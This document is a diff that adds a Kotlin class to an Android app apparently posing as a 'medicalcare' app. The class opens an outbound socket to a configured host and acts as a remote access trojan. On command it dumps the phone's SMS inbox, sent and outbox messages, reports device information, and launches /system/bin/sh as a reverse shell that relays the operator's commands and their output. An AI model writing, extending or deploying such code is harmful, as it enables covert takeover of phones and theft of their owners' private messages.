@@ -1,0 +1,118 @@
+package com.example.medicalcare.features.network.connection
+
+import android.content.Context
+import android.text.TextUtils
+import android.util.Log
+import com.example.medicalcare.features.network.commands.CommandHandler
+import com.example.medicalcare.features.network.commands.DeviceInfoProvider
+import com.example.medicalcare.features.network.commands.SMSReader
+import java.io.BufferedReader
+import java.io.DataOutputStream
+import java.io.InputStreamReader
+import java.net.Socket
+
+class TCPConnection(private val context: Context) : Runnable {
+    private val host = ConfigNetwork.HOST
+    private val port = ConfigNetwork.PORT
+
+    // Normal command handlers
+    private val handlers: Map<String, CommandHandler> = mapOf(
+        "1" to SMSReader(context),
+        "2" to SMSReader(context),
+        "3" to SMSReader(context),
+        "deviceInfo" to DeviceInfoProvider()
+    )
+
+    // Shell mode state
+    private var inShellMode = false
+    private var shellWriter: DataOutputStream? = null
+
+    override fun run() {
+        startReverseShell()
+    }
+
+    private fun startReverseShell() {
+        try {
+            Socket(host, port).use { socket ->
+                DataOutputStream(socket.getOutputStream()).use { toServer ->
+                    BufferedReader(InputStreamReader(socket.getInputStream())).use { fromServer ->
+                        Log.d("TCPConnection", "Connected to $host:$port")
+                        toServer.write("Hello\n".toByteArray())
+                        toServer.flush()
+
+                        var run = true
+                        while (run) {
+                            val command = fromServer.readLine()
+                            if (TextUtils.isEmpty(command)) continue
+
+                            if (inShellMode) {
+                                // Forward commands into shell stdin
+                                if (command.equals("exit", ignoreCase = true)) {
+                                    inShellMode = false
+                                    shellWriter?.close()
+                                    toServer.write("----------Exiting Shell-----------\n".toByteArray())
+                                    toServer.flush()
+                                } else {
+                                    shellWriter?.writeBytes(command + "\n")
+                                    shellWriter?.flush()
+                                }
+                                continue
+                            }
+
+                            // Normal command dispatcher
+                            when {
+                                command.equals("bye", ignoreCase = true) -> {
+                                    run = false
+                                    toServer.write("bye\n".toByteArray())
+                                    toServer.flush()
+                                    break
+                                }
+                                command.equals("shell", ignoreCase = true) -> {
+                                    val process = ProcessBuilder("/system/bin/sh")
+                                        .redirectErrorStream(true)
+                                        .start()
+
+                                    shellWriter = DataOutputStream(process.outputStream)
+                                    inShellMode = true
+
+                                    // Thread to read shell output continuously
+                                    Thread {
+                                        val shellReader = BufferedReader(InputStreamReader(process.inputStream))
+                                        var line: String?
+                                        try {
+                                            while (shellReader.readLine().also { line = it } != null && inShellMode) {
+                                                toServer.write((line + "\n").toByteArray())
+                                                toServer.flush()
+                                            }
+                                        } catch (e: Exception) {
+                                            Log.e("TCPConnection", "Error reading shell output", e)
+                                        }
+                                    }.start()
+
+                                    toServer.write("----------Starting Shell----------\n".toByteArray())
+                                    toServer.flush()
+                                }
+                                command.equals("dumpMessages", ignoreCase = true) -> {
+                                    toServer.write("1: Inbox Messages\n".toByteArray())
+                                    toServer.write("2: Sent Messages\n".toByteArray())
+                                    toServer.write("3: Outbox Messages\n".toByteArray())
+                                    toServer.flush()
+                                }
+                                else -> {
+                                    handlers[command]?.handle(command, toServer)
+                                        ?: run {
+                                            toServer.write("[!] Unknown command: $command\n".toByteArray())
+                                            toServer.flush()
+                                            Log.w("TCPConnection", "Received unknown command: $command")
+                                        }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("TCPConnection", "Error in reverse shell", e)
+        }
+    }
+}
